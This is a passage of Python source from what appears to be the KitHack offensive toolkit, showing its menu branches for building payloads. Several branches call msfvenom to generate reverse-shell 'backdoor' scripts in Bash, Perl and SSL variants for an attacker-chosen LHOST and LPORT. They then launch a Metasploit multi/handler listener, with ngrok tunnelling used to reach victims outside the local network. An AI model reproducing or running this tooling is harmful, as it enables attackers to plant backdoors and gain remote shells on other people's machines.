							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/shell_reverse_udp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			else:
				print("\n{}[X] INVALID OPTION\n".format(RED))
				time.sleep(3)
				pause("{}Press any key to continue...".format(GREEN))
				os.system('clear')
				main()	

		elif sys == '07':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} cmd/unix/reverse_bash'.format(WHITE, YELLOW))
			print ('{0}[02]{1} cmd/unix/reverse_bash_telnet_ssl'.format(WHITE, YELLOW))

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p cmd/unix/reverse_bash LHOST={0} LPORT={1} -f raw > output/{2}.sh'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.sh'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.sh".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()						
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_bash; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD cmd/unix/reverse_bash; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()						

			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p cmd/unix/reverse_bash_telnet_ssl LHOST={0} LPORT={1} -f raw > output/{2}.sh'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.sh'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.sh".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_bash_telnet_ssl; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD cmd/unix/reverse_bash_telnet_ssl; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			else:
				print("\n{}[X] INVALID OPTION\n".format(RED))
				time.sleep(3)
				pause("{}Press any key to continue...".format(GREEN))
				os.system('clear')
				main()	

		elif sys == '08':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))			
			print ('{0}[01]{1} cmd/unix/reverse_perl'.format(WHITE, YELLOW))
			print ('{0}[02]{1} cmd/unix/reverse_perl_ssl'.format(WHITE, YELLOW))

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p cmd/unix/reverse_perl LHOST={0} LPORT={1} -f raw > output/{2}.pl'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.pl'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.pl".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_perl; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD cmd/unix/reverse_perl; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()			
				else:	
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()						
			
			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p cmd/unix/reverse_perl_ssl LHOST={0} LPORT={1} -f raw > output/{2}.pl'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.pl'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.pl".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_perl_ssl; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD cmd/unix/reverse_perl_ssl; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			else:
				print("\n{}[X] INVALID OPTION\n".format(RED))
				time.sleep(3)
				pause("{}Press any key to continue...".format(GREEN))
				os.system('clear')
				main()

		elif sys == 9:
			LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
			LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
			PAYLOAD = raw_input("\n{0}SET PAYLOAD: {1}".format(YELLOW, DEFAULT))
			if ".tcp.ngrok.io" in LHOST:
				LHOST = "127.0.0.1"
				LPORT = "443"
			# continue
			os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {}; set LPORT {}; set PAYLOAD {}; exploit\'"'.format(LHOST, LPORT, PAYLOAD))
			pause("\n{}Press any key to continue...".format(GREEN))
			os.system('clear')
			main() 

		else:
			print("\n{}[X] INVALID OPTION\n".format(RED))
			time.sleep(3)
			pause("{}Press any key to continue...".format(GREEN))
			os.system('clear')
			main()

	elif option == '11':
		webbrowser.open("https://adrmxr.github.io/KitHack", new=1, autoraise=True)
		os.system('clear')
		main()	

	elif option == '12':
		pause("\n{}Press any key to exit...".format(GREEN))
		time.sleep(1)
		os.system('clear')
		print(exit_main)
		exit(0)

	else:
		print("\n{}[X] INVALID OPTION\n".format(RED))
		time.sleep(3)
		os.system('clear')
		main()

if __name__ == "__main__":
	try:
		check_connection()
		check_permissions()
		main()

	except KeyboardInterrupt:
		choice = input('\n\n{0}[1] {1}Return to KitHack {0}[2] {1}Exit \n{2}KitHack >> {1}'.format(GREEN, DEFAULT, RED))
		choice = choice.zfill(2)
		if choice == '01':
			if os.path.isfile('/usr/local/bin/kithack'):
				os.system('clear && kithack')
			else:
				os.system('clear && sudo python3 KitHack.py')	

		elif choice == '02':
			time.sleep(2)
			os.system('clear')
			print(exit_main)
			exit(0)
		else:
			print("\n{}[x] INVALID OPTION.".format(RED))
			time.sleep(2)	
			exit(0)
